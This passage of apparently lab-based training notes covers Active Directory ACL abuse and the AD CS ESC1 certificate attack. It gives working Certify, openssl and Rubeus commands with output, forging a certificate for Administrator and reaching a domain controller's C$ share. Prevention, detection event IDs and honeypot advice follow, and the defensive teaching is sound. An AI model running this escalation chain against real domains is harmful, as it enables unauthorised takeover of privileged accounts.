2022-12-19T14:16:39.3312221+01:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-12-19T14:16:39.3468314+01:00|INFORMATION|Initializing SharpHound at 14.16 on 19/12/2022
2022-12-19T14:16:39.5187113+01:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-12-19T14:16:39.7530826+01:00|INFORMATION|Beginning LDAP search for eagle.local
2022-12-19T14:16:39.7999574+01:00|INFORMATION|Producer has finished, closing LDAP channel
2022-12-19T14:16:39.7999574+01:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-12-19T14:17:09.8937530+01:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
2022-12-19T14:17:28.4874698+01:00|INFORMATION|Consumers finished, closing output channel
2022-12-19T14:17:28.5343302+01:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2022-12-19T14:17:28.6124768+01:00|INFORMATION|Status: 114 objects finished (+114 2.375)/s -- Using 46 MB RAM
2022-12-19T14:17:28.6124768+01:00|INFORMATION|Enumeration finished in 00:00:48.8638030
2022-12-19T14:17:28.6905842+01:00|INFORMATION|Saving cache with stats: 74 ID to type mappings.
 76 name to SID mappings.
 1 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2022-12-19T14:17:28.6905842+01:00|INFORMATION|SharpHound Enumeration Completed at 14.17 on 19/12/2022! Happy Graphing!
```

The ZIP file generated by SharpHound can then be visualized in BloodHound. Instead of looking for every misconfigured ACL in the environment, we will focus on potential escalation paths that originate from the user Bob (our initial user, which we had already compromised and have complete control over). Therefore, the following image demonstrates the different access that Bob has to the environment:

[bloodhound example](./bloodhound_example.webp)

Bob has full rights over the user Anni and the computer Server01. Below is what Bob can do with each of these:

- Case 1: Full rights over the user Anni. In this case, Bob can modify the object Anni by specifying some bonus SPN value and then perform the Kerberoast attack against it (if you recall, the success of this attack depends on the password's strength). However, Bob can also modify the password of the user Anni and then log in as that account, therefore, directly inheriting and being able to perform everything that Anni can (if Anni is a Domain admin, then Bob would have the same rights).
- Case 2: Full control over a computer object can also be fruitful. If `LAPS` is used in the environment, then Bob can obtain the password stored in the attributes and authenticate as the local Administrator account to this server. Another escalation path is abusing `Resource-Based Kerberos Delegation`, allowing Bob to authenticate as anyone to this server. Recall that from the previous attack, Server01 is trusted for Unconstrained delegation, so if Bob was to get administrative rights on this server, he has a potential escalation path to compromise the identity of a Domain Controller or other sensitive computer object.

We can also use [ADACLScanner](https://github.com/canix1/ADACLScanner) to create reports of `discretionary access control lists` (`DACLs`) and `system access control lists` (`SACLs`).

## Prevention

There are three things we can do:

- Begin `continuous assessment` to detect if this is a problem in the AD environment.
- `Educate` employees with high privileges to avoid doing this.
- `Automate` as much as possible from the access management process, and only assign privileged access to administrative accounts; this ensures that administrators don't manually edit accounts which reduces the risk of introducing delegated rights to unprivileged users.

## Detection

Fortunately, we have several ways to detect if AD objects are modified. Unfortunately, the events generated for modified objects are incomplete, as they do not provide granular visibility over what was changed. For example, in the first case described above, Bob modified Anni by adding an SPN value. By doing so, Bob will have the means to perform Kerberoasting against Anni. When the SPN value gets added, an event with the ID `4738`, "A user account was changed", is generated. However, this event does not demonstrate all modified user properties, including the SPN. Therefore, the event only notifies about the modification of a user but does not specify what exactly was changed ( although it does have a fair amount of fields that can be useful). We'll be able to see in the logs that bob modified anni in our logs.

However, using this event, we can tell if a non-privileged user performs privileged actions on another user. If, for example, all privileged users have a naming convention that begins with "adminxxxx", then any change not associated with "adminxxxx" is suspicious. If an ACL abuse leads to a password reset, the event ID `4724` will be logged.

Similarly, if Bob were to perform the second scenario, an event with ID `4742` would be generated, which is also unfortunately limited in the information it can provide; however, it notifies about the action that the user account Bob is compromised and used maliciously. 

## Honeypot

Misconfigured ACLs can be an effective mechanism of detection for suspicious behavior. There are two ways to approach this:

- Assign relatively high ACLs to a user account used as a honeypot via a previously discussed technique—for example, a user whose `fake` credentials are exposed in the description field. Having ACLs assigned to the account may provoke an adversary to attempt and verify if the account's exposed password is valid as it holds high potential.
- Have an account that `everyone` or many users can modify. This user will ideally be a honeypot user, with some activity to mimic real users. Any changes occurring on this honeypot user are malicious since there is no valid reason for anyone to perform any actions on it (except admins, that may occasionally need to reset the account's password to make the account look realistic). Therefore, any event ID `4738` associated with the honeypot user should trigger an alert. Additionally, mature organizations may immediately disable the user performing the change and initiate a forensic investigation on the source device.

# PKI - ESC1

After `SpectreOps` released the research paper [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf), `Active Directory Certificate Services` (`AD CS`) became one of the most favorite attack vectors for threat agents due to many reasons, including:

- Using certificates for authentication has more advantages than regular username/password credentials.
- Most PKI servers were misconfigured/vulnerable to at least one of the eight attacks discovered by SpectreOps (various researchers have discovered more attacks since then).

There are a plethora of advantages to using certificates and compromising the `Certificate Authority` (`CA`):

- Users and machines certificates are valid for 1+ years.
- Resetting a user password does not invalidate the certificate. With certificates, it doesn't matter how many times a user changes their password; the certificate will still be valid (unless expired or revoked).
- Misconfigured templates allow for obtaining a certificate for any user.
- Compromising the CA's private key results in forging `Golden Certificates`.

These advantages make certificates the preferred method for long-term persistence. While SpectreOps disclosed eight privilege escalation techniques, we will examine the first, `ESC1`, to demonstrate how it works. The description of `ESC1` is:

- `Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart Card Logon OID templates + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`.

## The Attack

To begin with, we will use [Certify](https://github.com/GhostPack/Certify) to scan the environment for vulnerabilities in the PKI infrastructure:
```PowerShell
PS C:\Users\bob\Downloads> .\Certify.exe find /vulnerable

  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=eagle,DC=local'

[*] Listing info about the Enterprise CA 'eagle-PKI-CA'

    Enterprise CA Name            : eagle-PKI-CA
    DNS Hostname                  : PKI.eagle.local
    FullName                      : PKI.eagle.local\eagle-PKI-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=eagle-PKI-CA, DC=eagle, DC=local
    Cert Thumbprint               : 7C59C4910A1C853128FE12C17C2A54D93D1EECAA
    Cert Serial                   : 780E7B38C053CCAB469A33CFAAAB9ECE
    Cert Start Date               : 09/08/2022 14.07.25
    Cert End Date                 : 09/08/2522 14.17.25
    Cert Chain                    : CN=eagle-PKI-CA,DC=eagle,DC=local
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
      Allow  ManageCA, ManageCertificates               EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : PKI.eagle.local\eagle-PKI-CA
    Template Name                         : UserCert ## name of the vulnerable template
    Schema Version                        : 4
    Validity Period                       : 10 years ## 
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT # "whoever requests the certificate, can specify whom is the certificate issued for"
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email, Smart Card Log-on ## Client auth -> "the certification can be used for authentification
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email, Smart Card Log-on
    Permissions
      Enrollment Permissions
        Enrollment Rights           : EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
    ##Who can request certs           EAGLE\Domain Users            S-1-5-21-1518138621-4282902758-752445584-513
                                      EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519
      Object Control Permissions
        Owner                       : EAGLE\Administrator           S-1-5-21-1518138621-4282902758-752445584-500
        WriteOwner Principals       : EAGLE\Administrator           S-1-5-21-1518138621-4282902758-752445584-500
                                      EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
                                      EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519
        WriteDacl Principals        : EAGLE\Administrator           S-1-5-21-1518138621-4282902758-752445584-500
                                      EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
                                      EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519
        WriteProperty Principals    : EAGLE\Administrator           S-1-5-21-1518138621-4282902758-752445584-500
                                      EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
                                      EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519

Certify completed in 00:00:00.9120044
```

When checking the 'Vulnerable Certificate Templates' section from the output of Certify, we will see that a single template with plenty of information about it is listed. We can tell that the name of the CA in the environment is `PKI.eagle.local\eagle-PKI-CA`, and the vulnerable template is named `UserCert`. The template is vulnerable because:

    All Domain users can request a certificate on this template.
    The flag https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1 is present, allowing the requester to specify the SAN (therefore, any user can request a certificate as any other user in the network, including privileged ones).
    Manager approval is not required (the certificate gets issued immediately after the request without approval).
    The certificate can be used for 'Client Authentication' (we can use it for login/authentication).

To abuse this template, we will use `Certify` and pass the argument `request` by specifying the full name of the CA, the name of the vulnerable template, and the name of the user, for example, `Administrator`:
```PowerShell
PS C:\Users\bob\Downloads> .\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator

  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : EAGLE\bob ## <--
[*] No subject name specified, using current context as subject.

[*] Template                : UserCert
[*] Subject                 : CN=bob, OU=EagleUsers, DC=eagle, DC=local
[*] AltName                 : Administrator ## <--

[*] Certificate Authority   : PKI.eagle.local\eagle-PKI-CA

[*] CA Response             : The certificate had been issued. ### <--
[*] Request ID              : 36

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIE...
<SNIP>
<SNIP>
wgP7EwPpxHKOrlZr6H+5lS58u/9EuIgdSk1X3VWuZvWRdjL15ovn
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGLzCCBRegAwIBAgITFgAAACx6zV6bbfN1ZQAAAAAALDANBgkqhkiG9w0BAQsF
<SNIP>
<SNIP>
eVAB
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx


Certify completed in 00:00:15.8803493
```

Once the attack finishes, we will obtain a certificate successfully. The command generates a `PEM` certificate and displays it as base64. We need to convert the `PEM` certificate to the [`PFX`](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/personal-information-exchange---pfx--files) format by running the command mentioned in the output of Certify (when asked for the password, press `Enter` without providing one), however, to be on the safe side, let's first execute the below command to avoid bad formatting of the `PEM` file.

Now we can copy past it on to a linux distro:

```bash
sed -i 's/\s\s\+/\n/g' cert.pem
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

We can then copy past the code back into the windows machine with:
```bash
cat cert.pfx | base64 > cert_b64.txt
```
Copy and paste the result into a text file in the windows machine and run this to convert it back from base64 to binary:
```PowerShell
[System.Convert]::FromBase64String((Get-Content "b64.txt")) | Set-Content "cert.pfx" -Encoding Byte
```

Now that we have the certificate in a usable `PFX` format (which `Rubeus` supports), we can request a Kerberos TGT for the account `Administrator` and authenticate with the certificate:
```PowerShell
PS C:\Users\bob\Downloads> .\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=bob, OU=EagleUsers, DC=eagle, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'eagle.local\Administrator' # <--
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGVjCCBlKgAwIBBaEDAgEWooIFaTCCBWVhggVhMIIFXaADAgEFoQ0bC0VBR0xFLkxPQ0FMoiAwHqA
      <SNIP>
      GA8yMDIyMTIyNjIwMDQ1M1qoDRsLRUFHTEUuTE9DQUypIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC2VhZ2xl
      LmxvY2Fs
[+] Ticket successfully imported! # <---

<SNIP>
```

After successful authentication, we will be able to list the content of the `C$` share on DC1:
```PowerShell
PS C:\Users\bob\Downloads> dir \\dc1\c$

    Directory: \\dc1\c$


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/15/2022   6:30 PM                DFSReports
d-----        10/13/2022  11:23 PM                Mimikatz
d-----          9/1/2022   9:49 PM                PerfLogs
d-r---        11/28/2022  10:59 AM                Program Files
d-----          9/1/2022   2:02 PM                Program Files (x86)
d-----        12/13/2022  11:22 AM                scripts
d-r---          8/7/2022   9:31 PM                Users
d-----        11/28/2022  11:27 AM                Windows
```

## Prevention

The attack would not be possible if the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag is not enabled in the certificate template. Another method to thwart this attack is to require `CA certificate manager approval` before issuing certificates; this will ensure that no certificates on potentially dangerous templates are issued without manual approval (which hopefully correlates that the request originated from a legit user).

Because there are many different privilege escalation techniques, it is highly advised to regularly scan the environment with `Certify` or other similar tools to find potential PKI issues.

## Detection

When the CA generates the certificate, two events will be logged, one for the received request and one for the issued certificate, if it succeeds. Those events have the IDs of `4886` and `4887`. They show the requester (`EAGLE\bob` from `WS001` in our lab) but no `SAN` detail.

The CA contains a list of all issued certificates, so if we look there, we will see the request for certificate ID `36`, this will also show the demanded `Certificate Template` (`UserCert` in our lab).

The general overview of the GUI tool does not display the SAN either, but we can tell that a certificate was issued via the vulnerable template. If we want to find the SAN information, we'll need to open the certificate itself either in the GUI Certificate -> Detail -> Subject Alternative Name. There is also the possibility to view that programmatically: the command `certutil -view` will dump everything on the CA with all of the information about each certificate (this can be massive in a large environment):
[certutil -view](./certutil-view_command.webp)

With some scripting, we can automate parsing and discovery of abused vulnerable templates by threat agents.

Finally, if you recall, in the attack, we used the obtained certificate for authentication and obtained a TGT; AD will log this request with the event ID `4768`, which will specifically have information about the logon attempt with a certificate. With thie we can correlate the User/Client IP for suspicious behavior, in addition to informatino about the Certifier Information (eagle-PKI-CA in our lab).

Note that events 4886 and 4887 will be generated on the machine issuing the certificate rather than the domain controller. If GUI access is not available, we can use PSSession to interact with the PKI machine, and the Get-WinEvent cmdlet to search for the events:
```cmd
C:\Users\bob\Downloads>runas /user:eagle\htb-student powershell

Enter the password for eagle\htb-student:
Attempting to start powershell as user "eagle\htb-student" ...
```
```PowerShell
## New session opened by the commands above
PS C:\WINDOWS\system32> New-PSSession PKI

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  4 WinRM4          PKI             RemoteMachine   Opened        Microsoft.PowerShell     Available

PS C:\WINDOWS\system32> Enter-PSSession PKI

[PKI]: PS C:\Users\htb-student\Documents> Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4886'}


   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
4/13/2023 4:05:50 PM          4886 Information      Certificate Services received a certificate request....
4/11/2023 1:24:02 PM          4886 Information      Certificate Services received a certificate request....
4/11/2023 1:15:01 PM          4886 Information      Certificate Services received a certificate request....


[PKI]: PS C:\Users\htb-student\Documents> Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4887'}


   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
4/13/2023 4:06:05 PM          4887 Information      Certificate Services approved a certificate request and...
4/13/2023 4:06:02 PM          4887 Information      Certificate Services approved a certificate request and...
4/11/2023 1:24:14 PM          4887 Information      Certificate Services approved a certificate request and...
4/11/2023 1:24:14 PM          4887 Information      Certificate Services approved a certificate request and...
4/11/2023 1:15:12 PM          4887 Information      Certificate Services approved a certificate request and..
```

To view the full audit log of the events, we can pipe the output into `Format-List` , or save the events in an array and check them individually:
```PowerShell
[pki]: PS C:\Users\htb-student\Documents> $events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
[pki]: PS C:\Users\htb-student\Documents> $events[0] | Format-List -Property *


Message              : Certificate Services received a certificate request.

                       Request ID:      51
                       Requester:       EAGLE\DC2$
                       Attributes:
                       CertificateTemplate:DomainController
                       ccm:PKI.eagle.local
Id                   : 4886
Version              : 0
Qualifiers           :
Level                : 0
Task                 : 12805
Opcode               : 0
Keywords             : -9214364837600034816
RecordId             : 21100
ProviderName         : Microsoft-Windows-Security-Auditing
ProviderId           : 54849625-5478-4994-a5ba-3e3b0328c30d
LogName              : Security
ProcessId            : 660
ThreadId             : 772
MachineName          : PKI.eagle.local
UserId               :
TimeCreated          : 4/11/2023 1:24:02 PM
ActivityId           : dcf643ef-6c67-0000-6e44-f6dc676cd901
RelatedActivityId    :
ContainerLog         : Security
MatchedQueryIds      : {}
Bookmark             : System.Diagnostics.Eventing.Reader.EventBookmark
LevelDisplayName     : Information
OpcodeDisplayName    : Info
TaskDisplayName      : Certification Services
KeywordsDisplayNames : {Audit Success}
Properties           : {System.Diagnostics.Eventing.Reader.EventProperty, System.Diagnostics.Eventing.Reader.EventProperty, System.Diagnostics.Eventing.Reader.EventProperty}
```



